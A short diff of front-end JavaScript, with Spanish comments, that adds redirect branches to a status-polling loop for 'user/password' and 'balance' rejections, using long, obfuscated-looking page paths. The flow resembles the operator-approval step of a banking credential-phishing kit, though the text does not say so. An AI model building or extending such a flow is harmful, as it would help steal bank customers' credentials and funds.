@@ -121,8 +121,16 @@ document.addEventListener('DOMContentLoaded', () => {
                             navigateWithLoader('/ZaBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIj');
                         } else if (statusData.status === 'rejected') {
                             clearInterval(pollInterval);
-                            // Redirigir con parámetro de error
+                            // Redirigir con parámetro de error genérico
                             window.location.href = '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn?error=true';
+                        } else if (statusData.status === 'rejected_user') {
+                            clearInterval(pollInterval);
+                            // Redirigir con parámetro de error de usuario/clave
+                            window.location.href = '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn?error=user';
+                        } else if (statusData.status === 'rejected_saldo') {
+                            clearInterval(pollInterval);
+                            // Redirigir con parámetro de error de saldo
+                            window.location.href = '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn?error=saldo';
                         }
                     } catch (err) {
                         console.error('Polling error:', err);
